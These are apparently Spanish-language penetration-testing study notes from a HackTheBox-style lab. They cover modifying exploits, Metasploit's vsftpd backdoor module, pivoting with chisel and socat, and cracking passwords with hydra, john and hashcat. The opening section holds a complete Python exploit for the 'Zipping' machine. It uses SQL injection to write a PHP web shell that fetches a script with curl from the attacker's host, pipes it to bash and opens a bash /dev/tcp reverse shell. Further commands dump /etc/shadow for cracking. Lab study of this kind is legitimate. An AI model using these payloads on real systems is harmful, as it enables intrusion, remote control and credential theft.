# Identificar y modificar exploits

```
import requests
import sys
import subprocess
import random

if len(sys.argv) < 2:
	#AQUI HABRIA QUE CAMBIAR EL LISTENER IP Y EL LISTENER PORT
    print("Usage: python3 HTB_Zipping_poc.py <listener ip> <listener port>")
    sys.exit(1)

fnb = random.randint(10, 10000)
url = "http://zipping.htb/"

session = requests.Session()

print("[+] Please run nc in other terminal: rlwrap -cAr nc -nvlp " + f"{sys.argv[2]}")

print("[+] Write php shell /var/lib/mysql/rvsl" + str(fnb) + ".php")

with open('revshell.sh', 'w') as f:
        f.write("#!/bin/bash\n")
        f.write(f"bash -i >& /dev/tcp/{sys.argv[1]}/{sys.argv[2]} 0>&1")
proc = subprocess.Popen(["python3", "-m", "http.server", "8000"])
phpshell = session.get(url + f"shop/index.php?page=product&id=%0A'%3bselect+'<%3fphp+system(\"curl+http%3a//{sys.argv[1]}:8000/revshell.sh|bash\")%3b%3f>'+into+outfile+'/var/lib/mysql/rvsl{fnb}.php'+%231")

print("[+] Get Reverse Shell")

phpshell = session.get(url + f"shop/index.php?page=..%2f..%2f..%2f..%2f..%2fvar%2flib%2fmysql%2frvsl{fnb}")

proc.terminate()
```

# Realizar explotación con metasploit

![[Pasted image 20240726092624.png]]
Después de hacer un nmap y haber visto las versiones de los servicios, podemos buscar a ver si hay exploits con searchsploit.
![[Pasted image 20240726092756.png]]
También podemos hacer la búsqueda desde la msfconsole.
![[Pasted image 20240726092848.png]]
Podemos buscar haber si hay algun exploit disponible  con search 
Podemos seleccionar el eploit con use 0, sino podemos hacer un use exploit/unix/ftp/vsftpd_234_backdoor
![[Pasted image 20240726093136.png]]
Con show options, podemos ver los parametros que necesita el exploit.
![[Pasted image 20240726093322.png]]
Con set marcamos el rhosts y le ponemos la ip de la máquina victima.
Hacemos el primer exploit y vemos que no ha conseguido crear la session, pero hacemos run y ya coge la shell como root.

# Demostrar cómo pivotar agregando una ruta y reenviando puertos
![[Pasted image 20240726094537.png]]
Creamos un servidor  con chisel para crear un tunel http entre la máquina victima y la mía.
![[Pasted image 20240726094612.png]]
Nos conectamos como cliente desde la máquina victima a la máquina atacante.
![[Pasted image 20240726094710.png]]
Podemos ver que se nos han conectado por el puerto 6565 y que se ha generado un proxy en el puerto 1080.
![[Pasted image 20240726094753.png]]
Añadimos está linea al final del todo del archivo /etc/proxychains4
![[Pasted image 20240726095115.png]]
Añadimos el proxy y ya podremos ver la página de la segunda máquina de la red. Pero para que estas máquinas puedan conectarse a nosotros necesitamos el socat.
![[Pasted image 20240726102443.png]]
Abrimos en la máquina victima 1 un escucha en el puerto 1111, y que lo reenvie a nuestra máquina atacante al puerto 448.

![[Pasted image 20240726102525.png]]
En la máquina atacante abrimos la escucha en el puerto 448 con nc.
![[Pasted image 20240726112713.png]]
Hacemos un revershell en la máquina victima 2.
![[Pasted image 20240726112739.png]]
Y en la escucha que tenemos en el puerto 448 se nos abrirá la shell de la máquina 2.





# Realizar ataques de fuerza bruta a contraseñas y descifrado de hash

![[Pasted image 20240726123145.png]]
Para hacer ataques de fuerza bruta a contraseñas, podemos utilizar hydra:
-L marca el diccionario de usernames que se probarán
-p marca el diccionario de passwords que utilizará
Después marcamos la ip objetivo y el servicio que queremos atacar.
-s marcamos puerto específico

John the ripper:
Con esta herramienta podemos hacer ataques de fuerza bruta a hashes de contraseña.

Practica de ejemplo:
`unshadow /etc/passwd /etc/shadow > password.txt`
`john --wordlist=/path/to/dictionary password.txt`
`john --wordlist=/home/kali/contraas.txt  hash.txt --format=crypt ` "--format=crypt(sirve para yescrypt que es el hash de la pass de linux)"
`john --show password.txt`


Con john podemos adaptarnos a diferentes formatos de hash y tipos de archivos protegidos por contraseña. Existen unas herramientas que convierten estos archivos o hashes a un formato legible para john the ripper. Estas herramientas son programas conocidos como 2john. Ej:
zip2john -- rar2john -- pdf2john -- keepass2john...

Hashcat

Con esta herramienta también podemos hacer ataques de fuerza bruta a contraseñas.

Ejemplos de uso:

`hashcat -m 0 -a 0 hash.txt rockyou.txt`

Con -m especificamos el tipo de hash (MD5 en este caso)
-a especifica el modo de ataque (ataque de diccionario)
Primero se pone el archivo donde tenemos el hash a crackear y luego ponemos el diccionario 